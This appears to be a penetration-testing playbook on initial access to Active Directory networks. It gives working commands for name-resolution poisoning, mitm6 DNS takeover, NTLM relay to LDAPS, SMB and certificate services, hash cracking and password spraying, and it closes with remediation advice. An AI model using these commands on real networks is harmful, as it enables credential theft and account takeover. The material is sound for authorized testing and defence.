# Stage 1 — Initial Access: Poisoning, Relay, Spraying

**These attacks touch the live network. Confirm they're in scope, run analyze
mode first, and coordinate timing with the client.**

## LLMNR / NBT-NS / mDNS poisoning (Responder)
When a host mistypes a share/name, broadcast name resolution lets you answer and
capture NetNTLMv1/v2 hashes.
```bash
responder -I eth0 -A                 # ANALYZE first — observe, don't poison
responder -I eth0 -wd                # active: poison + WPAD + capture
# hashes land in /usr/share/responder/logs/*.txt
hashcat -m 5600 netntlmv2.txt rockyou.txt     # crack NetNTLMv2
```
NetNTLMv2 can't PtH but cracks offline; if signing is off on a target, **relay it
instead of cracking** (below).

## IPv6 / mitm6 DNS takeover
Most networks leave IPv6 on and unmanaged. mitm6 becomes the DNS server via
DHCPv6 and funnels auth to ntlmrelayx.
```bash
mitm6 -d corp.local                  # in one terminal
ntlmrelayx.py -6 -t ldaps://<DC> -wh wpad.corp.local --delegate-access
```
Extremely effective but noisy/disruptive — use with care and client sign-off.

## NTLM relay (ntlmrelayx)
Relay captured/coerced auth to a target where **SMB signing is off** (SMB) or to
LDAP/S. Use the relay list from recon.
```bash
# Relay to LDAPS → grant RBCD or add computer (privesc without cracking)
ntlmrelayx.py -t ldaps://<DC> --delegate-access --no-dump
# Relay to SMB → dump SAM / exec on a signing-off host
ntlmrelayx.py -tf relaytargets.txt -smb2support --dump-sam
# Relay to ADCS web enrollment → get a cert for the victim (see adcs.md, ESC8)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```
Pair with coercion (`delegation-and-coercion.md`) to force a DC/host to
authenticate to your relay.

## Password spraying (policy-aware)
**Check lockout policy first** (`--pass-pol`) — spray 1 password per user per
window, wait out the reset window, never exceed threshold-1.
```bash
nxc smb <DC> -u users.txt -p 'Season2025!' --continue-on-success
nxc smb <DC> -u users.txt -p 'CompanyName1' --no-bruteforce  # 1:1 list mode
kerbrute passwordspray -d corp.local --dc <DC> users.txt 'Spring2025!'
```
Common seeds: `Season+Year!`, `Companyname1`, `Welcome1`, `Password1`, month
names, and any pattern hinted by the policy. Also test username==password and
blank passwords.

## Credential stuffing from prior finds
Reuse GPP/share/description creds across all hosts:
```bash
nxc smb <subnet/24> -u user -p pass                  # where does it work?
nxc smb <subnet/24> -u user -H <nthash> --local-auth # local cred reuse
```

## After you get a hash/cred
- NetNTLMv2 → crack (`-m 5600`) or relay.
- Cleartext/NT hash → validate (`nxc smb`), then BloodHound + Kerberoast.

## Remediation to recommend
Disable LLMNR/NBT-NS/mDNS (GPO) and use only DNS; disable IPv6 or configure
DHCPv6 guard/RA guard; enforce SMB signing (kills relay); require LDAP signing +
channel binding; strong/blocklisted passwords + MFA; lockout + monitoring on
spray patterns.
